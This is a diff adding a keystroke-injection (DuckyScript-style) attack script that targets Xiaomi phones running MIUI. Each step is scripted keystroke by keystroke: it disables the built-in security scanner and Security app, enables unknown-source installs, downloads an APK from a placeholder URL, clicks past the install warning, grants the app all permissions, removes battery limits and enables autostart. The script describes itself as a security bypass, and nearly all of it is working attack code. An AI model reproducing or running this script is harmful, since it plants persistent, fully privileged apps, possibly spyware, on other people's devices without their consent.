@@ -1,0 +1,330 @@
+REM Xiaomi/MIUI Security Bypass and App Installation
+REM Author: AryanVBW
+REM Version: 1.0
+REM Optimized for Xiaomi devices running MIUI
+
+REM ---- INITIAL SETUP ----
+DELAY 1500
+
+REM Wake up the device
+ENTER
+DELAY 500
+ENTER
+DELAY 1000
+
+REM Swipe up to unlock (MIUI method)
+SWIPE 500 1800 500 800
+DELAY 1500
+
+REM ---- STEP 1: DISABLE MIUI SECURITY SCANNER ----
+
+REM Open Settings
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING settings
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Navigate to Privacy & Security (MIUI path)
+STRING privacy
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Open Security Scanner
+STRING security scanner
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Disable Security Scanner
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM Go back to Privacy & Security
+BACK
+DELAY 800
+
+REM ---- STEP 2: DISABLE MIUI SECURITY APP ----
+
+REM Go to home screen
+HOME
+DELAY 800
+
+REM Open Security app (pre-installed on MIUI)
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING security
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Open Security app settings
+TAB
+DELAY 300
+TAB
+DELAY 300
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 1500
+
+REM Disable security scanning
+STRING scan
+DELAY 800
+ENTER
+DELAY 1500
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM ---- STEP 3: ENABLE DEVELOPER OPTIONS (MIUI PATH) ----
+
+REM Go to Settings
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING settings
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Navigate to About phone in MIUI
+STRING about
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Find MIUI version
+STRING miui version
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Tap on MIUI version 7 times
+REPEAT 7 {
+    ENTER
+    DELAY 300
+}
+DELAY 1500
+
+REM Go back to main Settings
+BACK
+DELAY 800
+
+REM ---- STEP 4: ENABLE INSTALLATION FROM UNKNOWN SOURCES (MIUI PATH) ----
+
+REM Navigate to Apps section in MIUI
+STRING apps
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Find "Install apps from external sources"
+STRING install apps
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Select Mi Browser or Chrome
+STRING chrome
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Enable permission (MIUI toggle)
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM ---- STEP 5: DISABLE MIUI OPTIMIZATION (IMPORTANT FOR APP COMPATIBILITY) ----
+
+REM Go to Developer options
+BACK
+DELAY 800
+BACK
+DELAY 800
+STRING additional
+DELAY 800
+ENTER
+DELAY 1500
+STRING developer
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Scroll down to find MIUI optimization
+SWIPE 500 1500 500 500
+DELAY 800
+SWIPE 500 1500 500 500
+DELAY 800
+SWIPE 500 1500 500 500
+DELAY 800
+
+REM Disable MIUI optimization
+STRING miui optimization
+DELAY 800
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM Confirm turning off
+STRING turn off
+DELAY 800
+TAB
+DELAY 300
+ENTER
+DELAY 2000
+
+REM ---- STEP 6: DOWNLOAD AND INSTALL APK (MIUI METHOD) ----
+
+REM Open Mi Browser or Chrome
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING browser
+DELAY 800
+ENTER
+DELAY 3000
+
+REM Access address bar (MIUI browser)
+TAB
+DELAY 500
+ENTER
+DELAY 1000
+
+REM Enter APK URL
+STRING https://example.com/app.apk
+DELAY 1000
+ENTER
+DELAY 5000
+
+REM Wait for download to start and complete
+DELAY 10000
+
+REM Open notification shade (MIUI gesture)
+SWIPE 500 100 500 1700
+DELAY 1500
+
+REM Tap on download notification
+ENTER
+DELAY 3000
+
+REM Handle MIUI security warning
+STRING install
+DELAY 800
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 3000
+
+REM ---- STEP 7: GRANT PERMISSIONS (MIUI PERMISSION MODEL) ----
+
+REM Go to Settings for MIUI permission management
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING settings
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Navigate to Apps in MIUI
+STRING apps
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Find the newly installed app
+STRING app
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Go to Permissions in MIUI
+STRING permissions
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Grant all permissions (MIUI's permission UI)
+REPEAT 10 {
+    TAB
+    DELAY 300
+    ENTER
+    DELAY 1000
+    STRING allow
+    DELAY 500
+    ENTER
+    DELAY 800
+    BACK
+    DELAY 800
+}
+
+REM ---- STEP 8: DISABLE MIUI BATTERY RESTRICTIONS ----
+
+REM Go back to app settings
+BACK
+DELAY 800
+
+REM Go to Battery saver settings
+STRING battery
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Set to "No restrictions"
+STRING no restrictions
+DELAY 800
+ENTER
+DELAY 1500
+
+REM ---- STEP 9: ENABLE AUTOSTART (MIUI SPECIFIC) ----
+
+REM Go back to app settings
+BACK
+DELAY 800
+
+REM Find Autostart option (MIUI specific)
+STRING autostart
+DELAY 800
+ENTER
+DELAY 1500
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM ---- STEP 10: LAUNCH THE APP ----
+
+REM Return to home screen
+HOME
+DELAY 800
+
+REM Open app drawer (MIUI method)
+SWIPE 500 1700 500 700
+DELAY 1000
+
+REM Find and open the app
+STRING app
+DELAY 800
+ENTER
+DELAY 2000
+
+REM ---- FINISHED ----
+REM MIUI security has been bypassed and app installed with full permissions
